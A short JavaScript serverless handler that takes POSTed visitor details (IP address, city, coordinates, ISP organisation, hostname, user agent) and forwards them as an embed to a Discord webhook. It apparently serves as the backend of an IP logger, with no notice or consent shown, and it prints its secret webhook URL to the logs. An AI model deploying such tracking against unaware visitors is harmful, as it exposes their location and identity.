export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  console.log('Request body:', req.body);
  console.log('Webhook URL:', process.env.WEBHOOK_URL);

  if (!process.env.WEBHOOK_URL) {
    console.error('WEBHOOK_URL env variable is not defined!');
    return res.status(500).json({ error: 'Webhook URL not configured' });
  }

  const data = req.body;

  const message = {
    embeds: [
      {
        title: "User Information",
        color: 16711680,
        fields: [
          { name: "IP Address", value: data.ip || "N/A", inline: true },
          { name: "City", value: data.city || "N/A", inline: true },
          { name: "Region", value: data.region || "N/A", inline: true },
          { name: "Country", value: data.country || "N/A", inline: true },
          { name: "Location", value: data.loc || "N/A", inline: true },
          { name: "Organisation", value: data.org || "N/A", inline: true },
          { name: "Hostname", value: data.hostname || "N/A", inline: true },
          { name: "Timezone", value: data.timezone || "N/A", inline: true },
          { name: "UserAgent", value: data.useragent || "N/A", inline: false }
        ],
        footer: {
          text: "User Info"
        }
      }
    ]
  };

  try {
    const response = await fetch(process.env.WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });

    if (!response.ok) {
      throw new Error(`Discord HTTP error! status: ${response.status}`);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error sending to webhook:", error);
    return res.status(500).json({ error: error.message });
  }
}
